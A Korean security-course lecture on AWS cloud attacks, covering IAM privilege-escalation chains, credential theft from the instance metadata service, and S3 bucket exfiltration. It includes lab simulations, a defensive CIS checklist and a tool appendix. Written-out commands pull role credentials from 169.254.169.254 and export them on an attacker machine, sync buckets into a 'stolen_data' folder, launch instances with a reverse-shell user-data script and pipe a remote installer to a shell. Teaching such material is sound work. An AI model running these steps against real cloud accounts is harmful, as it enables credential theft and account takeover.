# Week 13: 클라우드 공격 — AWS IAM 악용, 메타데이터 서비스, S3 탈취

## 학습 목표
- **클라우드 환경(AWS, GCP, Azure)**의 보안 모델과 공격 표면을 이해한다
- **AWS IAM(Identity and Access Management)** 정책의 취약점을 식별하고 악용할 수 있다
- **메타데이터 서비스(IMDS)**를 통한 크레덴셜 탈취 공격을 실행할 수 있다
- **S3 버킷** 설정 오류를 식별하고 데이터를 탈취할 수 있다
- 클라우드 권한 상승 경로를 분석하고 공격 체인을 구성할 수 있다
- 클라우드 보안 모범 사례와 방어 전략을 수립할 수 있다
- MITRE ATT&CK Cloud Matrix의 관련 기법을 매핑할 수 있다

## 전제 조건
- HTTP/HTTPS 프로토콜을 이해하고 있어야 한다
- SSRF 공격(Week 04)의 원리를 알고 있어야 한다
- JSON/YAML 형식을 읽고 해석할 수 있어야 한다
- API 키 기반 인증 개념을 이해하고 있어야 한다

## 실습 환경

| 호스트 | IP | 역할 | 접속 |
|--------|-----|------|------|
| bastion | 10.20.30.201 | 실습 기지 | `ssh ccc@10.20.30.201` |
| secu | 10.20.30.1 | 방화벽/IPS | `ssh ccc@10.20.30.1` |
| web | 10.20.30.80 | 웹 서버 (클라우드 시뮬레이션) | `ssh ccc@10.20.30.80` |
| siem | 10.20.30.100 | SIEM 모니터링 | `ssh ccc@10.20.30.100` |

> **참고**: 실제 AWS 환경이 없으므로 로컬 시뮬레이션으로 원리를 학습한다.

## 강의 시간 배분 (3시간)

| 시간 | 내용 | 유형 |
|------|------|------|
| 0:00-0:40 | 클라우드 보안 모델 + IAM 이론 | 강의 |
| 0:40-1:10 | IAM 정책 분석 + 악용 실습 | 실습 |
| 1:10-1:20 | 휴식 | - |
| 1:20-1:55 | 메타데이터 서비스 공격 실습 | 실습 |
| 1:55-2:30 | S3 버킷 탈취 + 권한 상승 | 실습 |
| 2:30-2:40 | 휴식 | - |
| 2:40-3:10 | 클라우드 방어 + 종합 실습 | 실습 |
| 3:10-3:30 | ATT&CK 매핑 + 퀴즈 + 과제 | 토론/퀴즈 |

---

# Part 1: 클라우드 보안 모델과 IAM (40분)

## 1.1 클라우드 공격 표면

| 공격 표면 | 예시 | 위험도 | ATT&CK |
|----------|------|--------|--------|
| **IAM 오설정** | 과도한 권한, 와일드카드 | 매우 높음 | T1078.004 |
| **메타데이터 서비스** | IMDS v1 SSRF | 매우 높음 | T1552.005 |
| **S3 공개 버킷** | ACL 오설정 | 높음 | T1530 |
| **Lambda 환경변수** | 시크릿 평문 저장 | 높음 | T1552.001 |
| **EC2 보안그룹** | 0.0.0.0/0 인바운드 | 중간 | T1190 |
| **CloudTrail 비활성** | 감사 로그 없음 | 높음 | T1562.008 |
| **KMS 키 정책** | 암호화 키 접근 제어 | 높음 | T1552 |

## 1.2 AWS IAM 구조

```
[IAM 계층 구조]
AWS Account
  ├── Root User (최고 권한, 사용 금지 권장)
  ├── IAM Users
  │   ├── user1 (AccessKey + SecretKey)
  │   └── user2 (Console Password)
  ├── IAM Groups
  │   ├── Developers (PowerUserAccess)
  │   └── Admins (AdministratorAccess)
  ├── IAM Roles
  │   ├── EC2-Role (EC2 인스턴스에 부여)
  │   └── Lambda-Role (Lambda 함수에 부여)
  └── Policies
      ├── AWS Managed (AdministratorAccess 등)
      └── Customer Managed (커스텀 정책)
```

### IAM 정책 위험 패턴

```json
// 위험 1: 와일드카드 리소스 + 모든 액션
{
  "Effect": "Allow",
  "Action": "*",
  "Resource": "*"
}

// 위험 2: iam:PassRole + 와일드카드
{
  "Effect": "Allow",
  "Action": ["iam:PassRole"],
  "Resource": "*"
}

// 위험 3: AssumeRole 제한 없음
{
  "Effect": "Allow",
  "Action": "sts:AssumeRole",
  "Resource": "*"
}
```

## 실습 1.1: IAM 정책 분석과 악용

> **실습 목적**: IAM 정책의 과도한 권한 설정을 식별하고 권한 상승 경로를 발견한다
>
> **배우는 것**: IAM 정책 JSON 분석, 위험 패턴 식별, 권한 상승 체인 구성을 배운다
>
> **결과 해석**: 과도한 권한이 발견되고 상승 경로가 구성되면 IAM 악용 성공이다
>
> **실전 활용**: 클라우드 모의해킹에서 IAM 정책 분석이 첫 번째 단계이다
>
> **명령어 해설**: AWS CLI aws iam list-policies, get-policy-version으로 정책을 분석한다
>
> **트러블슈팅**: AWS 환경이 없으면 시뮬레이션으로 정책 분석을 학습한다

```bash
python3 << 'PYEOF'
import json

print("=== IAM 정책 분석 시뮬레이션 ===")
print()

# 시뮬레이션 IAM 정책
policies = {
    "dev-user": {
        "Version": "2012-10-17",
        "Statement": [
            {
                "Effect": "Allow",
                "Action": ["s3:*", "ec2:Describe*", "lambda:*", "iam:PassRole"],
                "Resource": "*"
            }
        ]
    },
    "ci-user": {
        "Version": "2012-10-17",
        "Statement": [
            {
                "Effect": "Allow",
                "Action": ["ecr:*", "ecs:*", "iam:CreateRole", "iam:AttachRolePolicy"],
                "Resource": "*"
            }
        ]
    },
}

# 위험 분석
dangerous_actions = {
    "iam:PassRole": "역할 전달 → Lambda/EC2에 고권한 역할 부여",
    "iam:CreateRole": "새 역할 생성 → 관리자 정책 부착",
    "iam:AttachRolePolicy": "기존 역할에 정책 부착 → 권한 상승",
    "iam:CreateUser": "새 사용자 생성 → 백도어",
    "iam:CreateAccessKey": "다른 사용자 키 생성 → 계정 탈취",
    "sts:AssumeRole": "역할 전환 → 교차 계정 접근",
    "lambda:*": "Lambda 생성 → 코드 실행",
    "s3:*": "S3 전체 접근 → 데이터 유출",
}

for user, policy in policies.items():
    print(f"[사용자: {user}]")
    for stmt in policy["Statement"]:
        for action in stmt["Action"]:
            base_action = action.replace("*", "").rstrip(":")
            for danger, desc in dangerous_actions.items():
                if danger.startswith(base_action) or action == danger:
                    print(f"  [!!] {action} → {desc}")
    print()

print("=== IAM 권한 상승 체인 ===")
print("dev-user:")
print("  1. iam:PassRole → Lambda에 AdministratorAccess 역할 부여")
print("  2. lambda:CreateFunction → 관리자 권한으로 Lambda 생성")
print("  3. Lambda에서 iam:CreateAccessKey → Root 키 생성!")
print()
print("ci-user:")
print("  1. iam:CreateRole → AdminRole 생성")
print("  2. iam:AttachRolePolicy → AdministratorAccess 부착")
print("  3. iam:PassRole 없어도 ECS에서 역할 사용 가능")
PYEOF
```

---

# Part 2: 메타데이터 서비스 공격 (35분)

## 2.1 IMDS (Instance Metadata Service)

```
[IMDS 구조]
http://169.254.169.254/latest/
  ├── meta-data/
  │   ├── ami-id
  │   ├── hostname
  │   ├── instance-id
  │   ├── local-ipv4
  │   ├── public-ipv4
  │   ├── iam/
  │   │   └── security-credentials/
  │   │       └── EC2-Role  ← IAM 임시 크레덴셜!
  │   └── network/
  └── user-data/  ← 사용자 정의 스크립트 (비밀번호 포함 가능)
```

### IMDS v1 vs v2

| 항목 | IMDSv1 | IMDSv2 |
|------|--------|--------|
| 접근 방법 | GET 요청만 | PUT으로 토큰 발급 → 토큰으로 GET |
| SSRF 방어 | 없음 | 토큰 필요 (SSRF 어려움) |
| Hop 제한 | 없음 | TTL=1 (프록시 우회 방지) |
| 권고 | 비활성 | 기본 사용 |

## 실습 2.1: IMDS 공격 시뮬레이션

> **실습 목적**: SSRF를 통한 IMDS 접근과 IAM 크레덴셜 탈취를 시뮬레이션한다
>
> **배우는 것**: IMDS v1의 취약성, 임시 크레덴셜 구조, AWS API 악용을 배운다
>
> **결과 해석**: IMDS에서 AccessKeyId, SecretAccessKey, Token을 획득하면 성공이다
>
> **실전 활용**: Capital One 해킹(2019) 등 실제 클라우드 침해의 핵심 기법이다
>
> **명령어 해설**: curl로 169.254.169.254에 접근하여 메타데이터를 수집한다
>
> **트러블슈팅**: IMDSv2가 강제되면 PUT 요청으로 토큰을 먼저 발급받아야 한다

```bash
# IMDS 시뮬레이션 서버
cat > /tmp/imds_sim.py << 'IMDS'
import http.server
import json

class IMDSHandler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        responses = {
            "/latest/meta-data/": "ami-id\nhostname\ninstance-id\niam/\nlocal-ipv4",
            "/latest/meta-data/hostname": "web-server-prod-01",
            "/latest/meta-data/instance-id": "i-0123456789abcdef0",
            "/latest/meta-data/local-ipv4": "10.20.30.80",
            "/latest/meta-data/iam/security-credentials/": "EC2-S3-ReadWrite",
            "/latest/meta-data/iam/security-credentials/EC2-S3-ReadWrite": json.dumps({
                "Code": "Success",
                "AccessKeyId": "AKIAIOSFODNN7EXAMPLE",
                "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
                "Token": "IQoJb3JpZ2luX2VjEBAaDmFwLXNvdXRoZWFzdC0x...",
                "Expiration": "2026-04-04T20:00:00Z",
                "Type": "AWS-HMAC"
            }, indent=2),
            "/latest/user-data": "#!/bin/bash\nDB_PASS=ProductionPass123!\naws s3 sync s3://company-backup /backup",
        }
        path = self.path
        if path in responses:
            self.send_response(200)
            self.send_header('Content-Type', 'text/plain')
            self.end_headers()
            self.wfile.write(responses[path].encode())
        else:
            self.send_response(404)
            self.end_headers()
    def log_message(self, format, *args): pass

if __name__ == '__main__':
    server = http.server.HTTPServer(('0.0.0.0', 16925), IMDSHandler)
    import threading
    threading.Timer(15.0, server.shutdown).start()
    server.serve_forever()
IMDS

python3 /tmp/imds_sim.py &
IMDS_PID=$!
sleep 1

echo "=== IMDS 공격 시뮬레이션 ==="
echo ""
echo "[1] 메타데이터 열거"
curl -s http://localhost:16925/latest/meta-data/

echo ""
echo "[2] 호스트 정보"
echo "  hostname: $(curl -s http://localhost:16925/latest/meta-data/hostname)"
echo "  instance-id: $(curl -s http://localhost:16925/latest/meta-data/instance-id)"

echo ""
echo "[3] IAM 역할 크레덴셜 탈취!"
echo "  역할: $(curl -s http://localhost:16925/latest/meta-data/iam/security-credentials/)"
curl -s http://localhost:16925/latest/meta-data/iam/security-credentials/EC2-S3-ReadWrite | python3 -m json.tool 2>/dev/null

echo ""
echo "[4] user-data (비밀 정보 포함 가능)"
curl -s http://localhost:16925/latest/user-data

echo ""
echo "[5] 탈취한 크레덴셜로 AWS API 호출"
echo "  export AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE"
echo "  export AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/..."
echo "  export AWS_SESSION_TOKEN=IQoJb3JpZ2..."
echo "  aws s3 ls  # S3 버킷 목록 조회"
echo "  aws iam get-user  # 현재 사용자 확인"

kill $IMDS_PID 2>/dev/null
rm -f /tmp/imds_sim.py
echo ""
echo "[IMDS 시뮬레이션 완료]"
```

---

# Part 3-4: S3 탈취, 클라우드 방어 (35분)

## 실습 3.1: S3 버킷 보안 분석

> **실습 목적**: S3 버킷의 공개 설정과 ACL 오류를 식별하고 데이터를 탈취하는 기법을 배운다
>
> **배우는 것**: S3 ACL, 버킷 정책, 공개 접근 차단 설정의 분석과 악용을 배운다
>
> **결과 해석**: 공개 버킷에서 민감 데이터를 다운로드할 수 있으면 S3 탈취 성공이다
>
> **실전 활용**: 클라우드 보안 감사에서 S3 설정 검토에 활용한다
>
> **명령어 해설**: aws s3 ls, aws s3 cp로 버킷 내용을 열거하고 다운로드한다
>
> **트러블슈팅**: 접근 거부 시 다른 인증 방법(IMDS 크레덴셜)을 시도한다

```bash
python3 << 'PYEOF'
import json

print("=== S3 버킷 보안 분석 시뮬레이션 ===")
print()

# 위험한 S3 버킷 정책 예시
policies = {
    "company-public-assets": {
        "정책": "공개 읽기",
        "위험": "낮음 (의도적 공개)",
        "내용": "이미지, CSS, JS",
    },
    "company-backup-2025": {
        "정책": "ACL: authenticated-users READ",
        "위험": "매우 높음! (모든 AWS 계정 읽기)",
        "내용": "DB 백업, 설정 파일",
    },
    "company-logs": {
        "정책": "버킷 정책에 s3:* 와일드카드",
        "위험": "높음 (모든 작업 허용)",
        "내용": "CloudTrail 로그, 접근 로그",
    },
    "company-internal-docs": {
        "정책": "Block Public Access OFF",
        "위험": "중간 (실수로 공개 가능)",
        "내용": "내부 문서, HR 파일",
    },
}

print("[S3 버킷 보안 스캔 결과]")
for bucket, info in policies.items():
    risk_color = "!!" if "매우" in info["위험"] or "높음" in info["위험"] else "OK"
    print(f"\n  [{risk_color}] s3://{bucket}")
    print(f"    정책: {info['정책']}")
    print(f"    위험: {info['위험']}")
    print(f"    내용: {info['내용']}")

print()
print("=== S3 공격 명령어 ===")
print("  # 버킷 목록")
print("  aws s3 ls")
print("  # 버킷 내용 열거")
print("  aws s3 ls s3://company-backup-2025 --recursive")
print("  # 데이터 다운로드")
print("  aws s3 cp s3://company-backup-2025/db_dump.sql ./")
print("  # 전체 동기화")
print("  aws s3 sync s3://company-backup-2025 ./stolen_data/")
print()
print("=== S3 방어 ===")
print("  1. Block Public Access 활성화 (계정 수준)")
print("  2. 버킷 정책 최소 권한")
print("  3. S3 Object Lock (삭제 방지)")
print("  4. CloudTrail S3 이벤트 로깅")
print("  5. AWS Config 규칙으로 공개 버킷 탐지")
PYEOF
```

## 실습 3.2: 클라우드 권한 상승 체인

> **실습 목적**: 클라우드 환경에서의 권한 상승 경로를 분석하고 체인을 구성한다
>
> **배우는 것**: IAM 권한 남용, 서비스 간 역할 전환, 크로스 계정 접근의 체인을 배운다
>
> **결과 해석**: 제한된 권한에서 관리자 권한까지 상승하는 경로가 구성되면 성공이다
>
> **실전 활용**: 클라우드 보안 감사에서 권한 상승 리스크를 평가하는 데 활용한다
>
> **명령어 해설**: AWS CLI 명령과 IAM 정책 분석을 조합한다
>
> **트러블슈팅**: 권한이 부족하면 다른 역할/서비스를 경유하는 간접 경로를 탐색한다

```bash
python3 << 'PYEOF'
print("=== 클라우드 권한 상승 체인 ===")
print()

chains = [
    {
        "name": "Chain A: Lambda를 통한 권한 상승",
        "steps": [
            "1. 현재: ec2:*, lambda:*, iam:PassRole 보유",
            "2. IAM 역할 'AdminLambdaRole' 발견 (AdministratorAccess)",
            "3. Lambda 함수 생성 + AdminLambdaRole 부여",
            "4. Lambda에서 iam:CreateAccessKey 실행",
            "5. 새 Access Key로 관리자 접근!",
        ],
        "command": [
            "aws lambda create-function --function-name privesc \\",
            "  --runtime python3.11 --handler index.handler \\",
            "  --role arn:aws:iam::123456789:role/AdminLambdaRole \\",
            "  --zip-file fileb://payload.zip",
        ],
    },
    {
        "name": "Chain B: EC2 역할을 통한 상승",
        "steps": [
            "1. 현재: ec2:RunInstances, iam:PassRole 보유",
            "2. 새 EC2 인스턴스에 관리자 역할 부여하여 시작",
            "3. 인스턴스의 IMDS에서 관리자 크레덴셜 획득",
            "4. 관리자 크레덴셜로 모든 AWS 리소스 접근",
        ],
        "command": [
            "aws ec2 run-instances --instance-type t2.micro \\",
            "  --iam-instance-profile Name=AdminProfile \\",
            "  --user-data file://reverse_shell.sh",
        ],
    },
    {
        "name": "Chain C: CloudFormation을 통한 상승",
        "steps": [
            "1. 현재: cloudformation:* 보유",
            "2. CloudFormation 템플릿에 IAM 역할 생성 포함",
            "3. 스택 배포 시 관리자 역할 자동 생성",
            "4. 생성된 역할의 키로 접근",
        ],
        "command": [
            "aws cloudformation create-stack --stack-name privesc \\",
            "  --template-body file://admin_role.yaml \\",
            "  --capabilities CAPABILITY_NAMED_IAM",
        ],
    },
]

for chain in chains:
    print(f"[{chain['name']}]")
    for step in chain["steps"]:
        print(f"  {step}")
    print(f"  명령:")
    for cmd in chain["command"]:
        print(f"    {cmd}")
    print()

print("=== 권한 상승 도구 ===")
print("  Pacu: AWS 익스플로잇 프레임워크")
print("  ScoutSuite: 클라우드 보안 감사")
print("  Prowler: AWS 보안 모범 사례 검사")
print("  CloudSploit: 다중 클라우드 보안 스캔")
print("  PMAPPER: IAM 권한 상승 경로 분석")
PYEOF
```

## 실습 3.3: 클라우드 보안 종합 점검

> **실습 목적**: 클라우드 환경의 보안 설정을 종합적으로 점검하고 취약점을 식별한다
>
> **배우는 것**: 클라우드 보안 모범 사례, CIS Benchmark, AWS Well-Architected를 배운다
>
> **결과 해석**: 보안 설정 미흡 항목이 식별되고 개선안이 제시되면 점검 성공이다
>
> **실전 활용**: 클라우드 보안 감사와 컴플라이언스 검증에 활용한다
>
> **명령어 해설**: Prowler/ScoutSuite 스타일의 보안 점검 항목을 수동으로 확인한다
>
> **트러블슈팅**: 특정 서비스에 접근이 없으면 설정 파일 분석으로 대체한다

```bash
echo "=== 클라우드 보안 종합 점검 (CIS Benchmark 기반) ==="

cat << 'CHECKLIST'

[IAM 보안]
  [ ] Root 계정 MFA 활성화
  [ ] Root 계정 Access Key 비활성화
  [ ] IAM 사용자 MFA 강제
  [ ] 90일 이상 미사용 크레덴셜 비활성화
  [ ] 비밀번호 복잡도 정책 (14자 이상)
  [ ] IAM 정책에 * 리소스/액션 금지
  [ ] iam:PassRole 최소화
  [ ] 서비스 계정에 Access Key 대신 역할 사용

[S3 보안]
  [ ] Block Public Access 전체 활성화
  [ ] S3 버킷 암호화 (SSE-S3/SSE-KMS)
  [ ] 버킷 정책에 공개 접근 금지
  [ ] S3 액세스 로깅 활성화
  [ ] S3 Object Lock 활성화 (랜섬웨어 방어)

[네트워크 보안]
  [ ] 기본 VPC 삭제
  [ ] 보안 그룹에 0.0.0.0/0 인바운드 금지
  [ ] VPC Flow Log 활성화
  [ ] NAT Gateway 또는 VPC Endpoint 사용
  [ ] 네트워크 ACL 규칙 검토

[모니터링]
  [ ] CloudTrail 전체 리전 활성화
  [ ] CloudTrail 로그 암호화 + S3 보존
  [ ] GuardDuty 활성화
  [ ] Config 규칙 활성화
  [ ] CloudWatch 알림 설정

[EC2/컴퓨팅]
  [ ] IMDSv2 강제 (IMDSv1 비활성)
  [ ] EBS 볼륨 암호화
  [ ] 공개 AMI 금지
  [ ] Security Group 최소 포트 열기
  [ ] Systems Manager Patch Manager 적용

점검 결과 요약:
  ✓ 준수: ___ / 25 항목
  ✗ 미준수: ___ / 25 항목
  위험도: Critical ___, High ___, Medium ___, Low ___

CHECKLIST
```

---

## 검증 체크리스트

| 번호 | 검증 항목 | 확인 명령 | 기대 결과 |
|------|---------|----------|----------|
| 1 | IAM 구조 이해 | 구두 설명 | User/Role/Policy |
| 2 | 위험 정책 식별 | JSON 분석 | 3개 이상 위험 패턴 |
| 3 | IMDS 접근 | curl 시뮬레이션 | 크레덴셜 추출 |
| 4 | IMDSv1 vs v2 | 비교 | 보안 차이 설명 |
| 5 | S3 ACL 분석 | 정책 분석 | 공개 버킷 식별 |
| 6 | IAM 권한 상승 | 체인 구성 | PassRole→Lambda |
| 7 | user-data 탈취 | curl | 비밀 정보 추출 |
| 8 | 클라우드 방어 | 체크리스트 | 10항목 이상 |
| 9 | Capital One 분석 | 사례 | SSRF→IMDS 설명 |
| 10 | ATT&CK 매핑 | Cloud Matrix | 5개 이상 기법 |

---

## 과제

### 과제 1: 클라우드 공격 치트시트 (개인)
AWS IAM 악용, IMDS 공격, S3 탈취, Lambda 악용, CloudTrail 회피 5가지에 대한 치트시트를 작성하라. 각 공격의 전제 조건, 명령어, 방어 방법을 포함할 것.

### 과제 2: 클라우드 보안 아키텍처 (팀)
실습 환경(Bastion)을 AWS에 배포하는 경우의 보안 아키텍처를 설계하라. VPC, IAM, S3, KMS, CloudTrail, GuardDuty 설정을 포함할 것.

### 과제 3: IMDS 방어 테스트 (팀)
IMDSv1과 IMDSv2에 대한 SSRF 공격 시나리오를 각각 작성하고, v2의 방어 효과를 검증하는 테스트 계획을 수립하라.

---

## 실제 사례 (WitFoo Precinct 6 — Cloud 공격 심화)

> 출처: WitFoo Precinct 6 Cybersecurity Dataset (Apache 2.0)
> 본 lecture *Cloud 공격 심화* 학습 항목 매칭.

### Cloud 공격 심화 의 dataset 흔적 — "AssumeRole abuse"

dataset 의 정상 운영에서 *AssumeRole abuse* 신호의 baseline 을 알아두면, *Cloud 공격 심화* 시도 시 발생하는 anomaly 를 정량으로 탐지할 수 있다. 핵심 정량 지표는 — 9,340 baseline 의 anomaly.

```mermaid
graph LR
    SCENE["Cloud 공격 심화 시나리오"]
    TRACE["dataset 흔적<br/>AssumeRole abuse"]
    DETECT["탐지 / 분석"]

    SCENE --> TRACE
    TRACE --> DETECT

    style SCENE fill:#ffe6cc
    style DETECT fill:#cce6ff
```

### Case 1: dataset 정량 지표

| 항목 | 값 |
|---|---|
| 핵심 신호 | AssumeRole abuse |
| 정량 baseline | 9,340 baseline 의 anomaly |
| 학습 매핑 | AWS/Azure 권한 escalation |

**자세한 해석**: AWS/Azure 권한 escalation. 이 차이를 정량으로 측정해야 *공격 시도와 정상 운영의 구분* 이 가능. 학생이 baseline 숫자를 외워두면 — 운영 환경에서 anomaly 를 즉시 탐지할 수 있다.

### Case 2: 실전 적용 시나리오

| 단계 | dataset 활용 |
|---|---|
| 시도 식별 | AssumeRole abuse 의 spike |
| 정상 vs 이상 | baseline 대비 비율 |
| 룰 작성 | Suricata / Wazuh / Sigma |
| 검증 | dataset 재실행 |

**자세한 해석**: 운영 환경 룰 작성은 — *baseline 측정 → 임계 결정 → 룰 작성 → dataset 검증* 의 4 단계. 한 단계라도 빠지면 false positive 폭증.

### 이 사례에서 학생이 배워야 할 3가지

1. **Cloud 공격 심화 = AssumeRole abuse 의 anomaly** — 정량 신호로 탐지.
2. **baseline 숫자 외우기** — 9,340 baseline 의 anomaly.
3. **4 단계 룰 작성** — 측정 → 임계 → 룰 → 검증.

**학생 액션**: Pacu lab.


---

## 부록: 학습 OSS 도구 매트릭스 (Course13 Attack Advanced — Week 13 클라우드 공격 / IAM·IMDS·S3·K8s)

> 이 부록은 lab `attack-adv-ai/week13.yaml` (15 step + multi_task) 의 모든 명령을
> 실제로 실행 가능한 형태로 도구·옵션·예상 출력·해석을 한 곳에 모았다.
> 실 AWS 계정이 없어도 **LocalStack** + **Pacu** + **CloudGoat** + **kind/minikube** 로
> 격리 환경에서 IAM·IMDS·S3·K8s 공격을 모두 재현한다. 절대 실 운영 계정 (회사·개인) 에서는
> 시도 금지 — 비용·법적 책임·계정 정지 위험.

### lab step → 도구 매핑 표

| step | 학습 항목 | 핵심 OSS 도구 / 명령 | ATT&CK Cloud | Blue 통제 |
|------|----------|---------------------|--------------|-----------|
| s1 | 공격 표면 + ATT&CK Cloud | aws CLI, ATT&CK Navigator, ScoutSuite | T1078.004 | CloudTrail + Config |
| s2 | SSRF → IMDS 자격증명 탈취 | `curl http://169.254.169.254/`, `imds-tool` | T1552.005 | IMDSv2 강제, GuardDuty |
| s3 | S3 버킷 오설정 | `aws s3 ls`, `s3scanner`, `bucket-stream`, `cloud_enum` | T1530 | Block Public Access, Access Analyzer |
| s4 | IAM 권한 상승 | Pacu, CloudSplaining, enumerate-iam, PMapper | T1098.003 | least-privilege + Access Analyzer |
| s5 | Cross-account / VPC 측면이동 | `aws sts assume-role`, AWS_VAULT, role-juggler | T1199 / T1078 | SCP + boundary policy |
| s6 | Lambda / Serverless | `aws lambda`, lambda-proxy, serverless-goat | T1059.007 | runtime monitoring, IAM 분리 |
| s7 | Kubernetes Pod escape | kube-hunter, Peirates, kube-bench, krane | T1610 / T1611 | PodSecurityStandards, OPA Gatekeeper |
| s8 | 자격증명 유출 패턴 | trufflehog, gitleaks, cloud_enum, AWS Health | T1552 (전체) | secret manager + rotation + IMDSv2 |
| s9 | 클라우드 지속성 | Pacu (backdoor_users_keys), CloudSplaining | T1098 (전체) | CloudTrail alert, Access Analyzer |
| s10 | CSPM (Posture) | ScoutSuite, Prowler, CloudSploit, Steampipe | DETECT | CSPM 일일 스캔 + Security Hub |
| s11 | CloudTrail 로그 분석 | aws CLI, CloudTrail Lake, jq, Sigma rules | DETECT | EventBridge 알림 + Athena query |
| s12 | 클라우드 네이티브 보안 비교 | GuardDuty, Inspector, Macie, Security Hub | DETECT | 다층 통합 alert |
| s13 | IaC 보안 (Terraform) | Checkov, tfsec, terrascan, KICS | DETECT | PR gate + Terraform Cloud Sentinel |
| s14 | Zero Trust 클라우드 | BeyondCorp, AWS Verified Access, ZTNA | NIST ZTA | identity-aware proxy + ABAC |
| s15 | 클라우드 보안 보고서 | NIST SP 800-204 / CIS Benchmarks / CNCF | NIST | 분기별 평가 |
| s99 | 통합 다단계 (s1→s2→s3→s4→s5) | Bastion plan: surface→IMDS→S3→IAM esc→cross-account | 다중 | 단계별 통제 누적 |

### 학생 환경 준비 (실 AWS 없이 격리 시뮬)

```bash
# === [공통] aws CLI + boto3 ===
sudo apt install -y awscli python3-pip
pip install --user boto3 awscli-local
aws --version

# === [Sim] LocalStack — AWS 의 100+ 서비스 로컬 emulation ===
pip install --user localstack
localstack start -d              # daemon mode (S3, IAM, Lambda, EC2 등)
localstack status services       # 활성 서비스
# 사용: aws --endpoint-url=http://localhost:4566 s3 ls

# === [Sim] CloudGoat — 의도적 취약 AWS 시나리오 ===
git clone https://github.com/RhinoSecurityLabs/cloudgoat /tmp/cloudgoat
cd /tmp/cloudgoat && pip install -r requirements.txt
./cloudgoat.py config profile
./cloudgoat.py create iam_privesc_by_attachment    # 시나리오 생성 (실 AWS 필요)

# === [Red] Pacu — AWS 권한 상승 자동화 도구 ===
pip install --user pacu
pacu                             # CLI 실행
# 모듈: iam__enum_users_roles_policies_groups, iam__privesc_scan, iam__backdoor_users_keys

# === [Red] enumerate-iam — IAM 권한 매트릭스 ===
git clone https://github.com/andresriancho/enumerate-iam /tmp/enum-iam
cd /tmp/enum-iam && pip install -r requirements.txt
python enumerate-iam.py --access-key=AKIA... --secret-key=...

# === [Red] CloudSplaining — IAM 정책 위험 분석 ===
pip install --user cloudsplaining
cloudsplaining download --output ./aws-policies
cloudsplaining scan --input-file ./aws-policies

# === [Red] PMapper — IAM 그래프 분석 ===
pip install --user principalmapper
pmapper graph create
pmapper visualize --filetype svg

# === [Red] cloud_enum — 다중 클라우드 자산 열거 ===
pip install --user cloud-enum
cloud_enum -k mycompany --quickscan

# === [Red] s3scanner — S3 버킷 열거·permission 검사 ===
pip install --user s3scanner
s3scanner scan --bucket-list buckets.txt

# === [Red] Kubernetes 공격 도구 ===
sudo apt install -y kubectl
kubectl version --client

# kind — 로컬 K8s
go install sigs.k8s.io/kind@latest
kind create cluster --name attack-lab

# kube-hunter — K8s 취약점 스캐너
pip install --user kube-hunter
kube-hunter --remote 127.0.0.1

# Peirates — K8s 권한 상승 도구
git clone https://github.com/inguardians/peirates /tmp/peirates
cd /tmp/peirates && go build && sudo cp peirates /usr/local/bin/

# kube-bench — CIS K8s benchmark
docker run --rm --pid=host -v /etc:/etc:ro -v /var:/var:ro \
  aquasec/kube-bench:latest run --targets master,node

# krane — RBAC 정적 분석
pip install --user krane

# === [Blue] CSPM ===
# ScoutSuite (NCC Group)
pip install --user scoutsuite
scout aws --no-browser --report-name lab1
# 출력: scoutsuite-report/aws-lab1/index.html

# Prowler — AWS/Azure/GCP 평가 (300+ checks)
pip install --user prowler
prowler aws --quick                # quick checks
prowler aws --output-formats html,json,csv

# CloudSploit (Aqua) — Multi-cloud
git clone https://github.com/aquasecurity/cloudsploit /tmp/cloudsploit
cd /tmp/cloudsploit && npm install
node index.js --collection_dir=./output

# Steampipe — SQL 로 AWS 자원 조회 (Powerful)
sudo /bin/sh -c "$(curl -fsSL https://steampipe.io/install/steampipe.sh)"
steampipe plugin install aws
steampipe query "select arn, public_access_block_configuration from aws_s3_bucket where public_access_block_configuration is null"

# === [Blue] IaC 보안 ===
# Checkov (Bridgecrew) — Terraform/CFN/K8s/Helm 등 1000+ check
pip install --user checkov
checkov -d ./terraform/

# tfsec — Terraform 전용
sudo apt install -y wget
wget https://github.com/aquasecurity/tfsec/releases/latest/download/tfsec-linux-amd64
sudo install tfsec-linux-amd64 /usr/local/bin/tfsec
tfsec ./terraform/

# terrascan — Accurics
curl -L "$(curl -s https://api.github.com/repos/tenable/terrascan/releases/latest | grep -o -E 'https://.+?_Linux_x86_64.tar.gz')" -o terrascan.tar.gz
tar xf terrascan.tar.gz && sudo install terrascan /usr/local/bin/
terrascan scan -d ./terraform/

# KICS — Checkmarx (다중 IaC)
docker run -v $(pwd):/path checkmarx/kics:latest scan -p "/path"

# === [Blue] CloudTrail / GuardDuty 분석 ===
# AWS CloudTrail Lake — Athena 비슷한 SQL 쿼리
aws cloudtrail start-query --query-statement \
  "SELECT eventName, sourceIPAddress FROM <event-data-store-id> WHERE eventTime > '2026-05-01'"

# Sigma — generic detection rules
git clone https://github.com/SigmaHQ/sigma /tmp/sigma
ls /tmp/sigma/rules/cloud/aws/    # 100+ AWS rules

# Stratus Red Team (DataDog) — 클라우드 공격 시뮬레이션
go install github.com/DataDog/stratus-red-team/v2/cmd/stratus@latest
stratus list --platform aws
stratus warmup aws.credential-access.ec2-get-password-data
stratus detonate aws.credential-access.ec2-get-password-data
```

### 핵심 도구별 상세 사용법

#### 도구 1: aws CLI + IMDS — 메타데이터 자격증명 탈취 (Step 2)

```bash
# === IMDSv1 (취약) — 단일 GET 으로 자격증명 노출 ===
# EC2 안에서 (또는 SSRF 로 외부에서 169.254.169.254 접근 가능 시)

# 사용 가능한 role 확인
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/
# AdminRole

# 실 자격증명 추출
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/AdminRole
# {
#   "Code": "Success",
#   "AccessKeyId": "ASIAIOSFODNN7EXAMPLE",
#   "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
#   "Token": "AgoJb3JpZ2luX2VjE...",
#   "Expiration": "2026-05-02T18:00:00Z"
# }

# 즉시 외부 적용 — attacker 머신에서
export AWS_ACCESS_KEY_ID=ASIAIOSFODNN7EXAMPLE
export AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
export AWS_SESSION_TOKEN=AgoJb3JpZ2luX2VjE...
